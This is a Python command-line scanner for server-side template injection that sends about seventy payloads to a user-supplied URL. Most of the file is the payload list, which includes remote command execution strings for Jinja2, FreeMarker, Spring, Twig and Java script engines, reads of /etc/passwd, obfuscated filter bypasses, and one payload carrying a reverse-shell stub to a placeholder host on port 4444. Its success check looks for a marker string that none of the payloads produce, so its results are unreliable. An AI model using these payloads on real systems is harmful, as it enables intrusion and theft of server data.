import requests
from colorama import init, Fore, Style
import pyfiglet

# Initialize colorama for colored terminal output
init()

# Function to test Server-Side Template Injection (SSTI) vulnerability
def test_ssti(url, payload):
    try:
        # Craft the URL with the payload
        payload_url = url + payload

        # Send a GET request with the crafted payload
        response = requests.get(payload_url)

        # Check if the response status code indicates success (2xx)
        if response.ok:
            # Check if the response contains the expected output indicating SSTI
            if "SSTI_TEST_SUCCESSFUL" in response.text:
                print(Fore.GREEN + "[+] Potential SSTI vulnerability found at:", url)
            else:
                print(Fore.RED + "[-] No SSTI vulnerability found at:", url)
        else:
            print(Fore.YELLOW + "[-] Error:", response.status_code)
    except Exception as e:
        print(Fore.RED + "[-] An error occurred:", str(e))

# Main function
def main():
    ascii_banner = pyfiglet.figlet_format("SSTI - SERVER SIDE TEMPLATE INJECTIONS")
    print(ascii_banner)
    try:
        # Prompt the user to input the target website URL
        target_url = input("Enter the URL of the website to test: ")

        # Payloads to inject for testing SSTI vulnerability
        payloads = [
            "{{7*7}}",
            "{{7*'7'}}",
            "{{config}}",
            "{{self}}",
            "{{7*'a'}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('id').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('whoami').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('uname -a').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('cat /etc/passwd').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('ls').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('pwd').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('ifconfig').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('netstat -an').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('who').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('w').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('cat /etc/hosts').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()[59]('netstat -an | grep ESTABLISHED').read()}}",
            "{{2*2}}[[3*3]]",
            "{{3*3}}",
            "{{3*'3'}}",
            "<%= 3 * 3 %>",
            "${6*6}",
            "${{3*3}}",
            "@(6+5)",
            "#{3*3}",
            "#{ 3 * 3 }",
            "{{dump(app)}}",
            "{{app.request.server.all|join(',')}}",
            "{{config.items()}}",
            "{{ [].class.base.subclasses() }}",
            "{{''.class.mro()[1].subclasses()}}",
            "{{ ''.__class__.__mro__[2].__subclasses__() }}",
            "{{''.__class__.__base__.__subclasses__()}}",
            "{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}",
            "{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",
            "{{'a'.toUpperCase()}}",
            "{{ request }}",
            "{{self}}",
            "<%= File.open('/etc/passwd').read %>",
            "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ ex('id')}",
            "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "{{app.request.query.filter(0,0,1024,{'options':'system'})}}",
            "{{ ''.__class__.__mro__[{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
            "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",
            "{$smarty.version}",
            "{php}echo `id`;{/php}",
            "{{['id']|filter('system')}}",
            "{{['cat\x20/etc/passwd']|filter('system')}}",
            "{{['cat$IFS/etc/passwd']|filter('system')}}",
            "{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",
            "{{request|attr(['_'*2,'class','_'*2]|join)}}",
            "{{request|attr(['__','class','__']|join)}}",
            "{{request|attr('__class__')}}",
            "{{request.__class__}}",
            "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}",
            "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}",
            "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}",
            "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}",
            "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}",
            "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"/etc/passwd\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}",
            "${T(java.lang.System).getenv()}",
            "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}",
            "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}"
        ]

        print("[*] Testing for Server-Side Template Injection vulnerability on:", target_url)

        # Test each payload
        for idx, payload in enumerate(payloads, start=1):
            payload_label = f"SSTI{idx}"
            print("[*] Testing payload:", payload_label)
            test_ssti(target_url, payload)

    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "[-] User interrupted")

# Entry point of the program
if __name__ == "__main__":
    main()

